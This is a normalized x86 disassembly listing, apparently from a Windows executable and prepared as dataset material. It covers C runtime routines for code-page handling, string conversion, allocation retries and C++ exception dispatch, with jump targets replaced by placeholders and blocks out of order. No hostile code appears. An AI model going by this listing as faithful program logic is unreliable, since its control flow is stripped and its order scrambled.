mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
test ecx ecx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov [ eax ] ebx
mov eax ebx
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ edi ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax 0x5
ja r-xdata
mov ecx [ ebp - 0x28 ]
push ebx
push [ edi ]
movzx eax ax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x24 ]
mov edx 0xff
push edx
add eax 0x81
push eax
push edx
inc ecx
push ecx
push 0x100
push [ esi + 0xa8 ]
mov [ ebp - 0x34 ] ecx
push ebx
call sub_426663
add esp 0x24
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push [ edi ]
mov ecx 0xff
push ecx
add eax 0x81
push eax
push ecx
push [ ebp - 0x34 ]
push 0x200
push [ esi + 0xa8 ]
push ebx
call sub_426663
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x1
jle r-xdata
mov eax [ ebp - 0x20 ]
push ebx
push [ edi ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x28 ]
push 0x1
push ebx
call sub_43180c
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov edi [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov [ edi + 0xfe ] cx
mov ecx [ ebp - 0x24 ]
sub ecx 0xffffff80
mov [ ecx - 0x1 ] bl
mov [ eax + 0x7f ] bl
sub eax 0xffffff80
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] bl
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
mov [ eax ] bl
jle r-xdata
mov edi [ ebp - 0x28 ]
lea ecx [ ebp - 0x11 ]
push 0xfe
lea eax [ edi + 0x200 ]
push eax
push edi
call sub_424fc0
mov ecx [ ebp - 0x24 ]
push 0x7f
lea eax [ ecx + 0x100 ]
push eax
push ecx
call sub_424fc0
mov ecx [ ebp - 0x1c ]
push 0x7f
lea eax [ ecx + 0x100 ]
push eax
push ecx
call sub_424fc0
mov eax [ esi + 0x88 ]
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
lea edi [ esi + 0x4 ]
movzx edx [ ecx - 0x1 ]
movzx eax al
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0x88 ] eax
lea eax [ edi + 0x100 ]
mov [ esi + 0x90 ] eax
lea eax [ edi + 0xfe ]
mov [ esi + 0x8c ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0x94 ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0x98 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0x74 ] eax
jmp r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
cmp edx eax
jle r-xdata
push [ ebp - 0x28 ]
call sub_422732
pop ecx
mov eax ebx
pop edi
jmp r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_422732
mov eax [ esi + 0x94 ]
add eax 0xffffff80
push eax
call sub_422732
mov eax [ esi + 0x98 ]
add eax 0xffffff80
push eax
call sub_422732
push [ esi + 0x88 ]
call sub_422732
add esp 0x10
movzx edx [ ecx - 0x1 ]
movzx eax al
cmp edx eax
jg r-xdata
mov [ edx + edi ] 0x20
movzx eax [ ecx ]
inc edx
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea eax [ edi + 0x100 ]
lea eax [ eax + edx * 2 ]
mov [ ebp - 0x34 ] eax
mov edi eax
mov al [ ecx ]
test al al
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax 0x8000
mov [ edi ] ax
movzx eax [ ecx ]
inc edx
lea edi [ edi + 0x2 ]
cmp edx eax
jle r-xdata
mov edi [ ebp - 0x20 ]
sub_42647a
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_42487a
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42970f
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_42276a
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_42fa60
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42970f
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42970f
add esp 0x18
jmp r-xdata
push esi
call sub_42487a
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_42276a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_42fa60
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_426663
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_42647a
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4266a7
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4318f5
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4266f1
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_42276a
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_42673a
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43184a
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_426786
push 0x8
push r--data
call sub_429ad0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_429b15
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_42589f
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_426837
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_423991
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_422732#2
pop ecx
sub_42685c
push 0x30
push r--data
call sub_429ad0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_425a7d
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_42f4f6
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_42f4f6
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_42f4f6
mov [ eax + 0x88 ] esi
call sub_42f4f6
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_425841
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4269ab
mov eax edi
call sub_429b15
retn
sub_4268fb
mov esp [ ebp - 0x18 ]
call sub_42f4f6
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push edx
push ebx
push edi
call sub_427304
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4269ab
mov eax edi
call sub_429b15
retn
mov esi eax
imul esi esi 0x14
mov edi [ edx + 0x10 ]
cmp ecx [ esi + edi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] ecx
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov eax ebx
mov [ ebp - 0x24 ] eax
cmp [ edx + 0xc ] eax
jbe r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov edx [ ebp + 0x18 ]
cmp ecx [ esi + edx + 0x8 ]
mov edx [ ebp + 0x14 ]
jg r-xdata
imul eax eax 0x14
mov ecx [ edx + 0x10 ]
mov eax [ eax + ecx + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov ecx [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
sub_4269ab
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_425aa7
pop ecx
call sub_42f4f6
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_42f4f6
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_425af7
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_426786
pop ecx
pop ecx
jmp r-xdata
sub_426a6a
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_4270a3
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_4259fa
call sub_425a2a
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_427304
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_42685c
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_426ae5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_42f4f6
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_426b32
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
cmp [ edi + 0x4 ] 0x80
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_42e150
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_42f4f6
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_42e150
call sub_42e188
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_426ecd
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_42f4f6
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_42f4f6
mov esi [ eax + 0x88 ]
call sub_42f4f6
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x24 ] 0x1
call sub_43196f
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_42e150
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_42597b
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_42f4f6
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_426786
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_42f4f6
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_42f4f6
push [ ebp - 0x14 ]
mov [ eax + 0x94 ] ebx
push esi
call sub_426fe7
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
mov [ ebp - 0x20 ] edi
test edi edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_42e150
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_426fe7
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_426786
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp + 0x18 ] r--data
call sub_42392e
push r--data
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x3c ] r--data
call sub_42569b
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_42f4f6
call sub_42f4f6
call sub_42f4f6
mov [ eax + 0x88 ] esi
call sub_42f4f6
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_422542
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_4274bc
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
dec eax
add ecx 0x10
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
test eax eax
jg r-xdata
call sub_425a2a
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_427304
add esp 0x10
push [ edi + 0x1c ]
call sub_426a2a
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_426a6a
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
dec eax
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_426ecd
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
leave
retn
push ebx
push esi
call sub_42f4f6
cmp [ eax + 0x80 ] 0x0
mov ebx [ ebp + 0x18 ]
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_42f4f6
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_42597b
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add esp 0x14
cmp ecx edx
jae r-xdata
call sub_42e150
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_4258a6
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_426a6a
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add esp 0x2c
sub_426fe7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_42e150
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_4274bc
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_42707e
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_4270a3
push 0x8
push r--data
call sub_429ad0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_42707e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_42589f
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_427131
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429b15
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_42707e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_42589f
jmp r-xdata
sub_427131
push 0xc
push r--data
call sub_429ad0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ eax ]
mov edi [ ebp + 0xc ]
test edx edx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
push 0x1
test dl 0x8
je r-xdata
add edi 0xc
add edi ecx
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42e150
push 0x1
push edi
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
mov [ edi ] ecx
mov eax [ ebp + 0x14 ]
add eax 0x8
push eax
push ecx
push 0x1
push edi
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_43196f
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_421ef0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
push [ esi + 0x18 ]
call sub_43196f
pop ecx
test eax eax
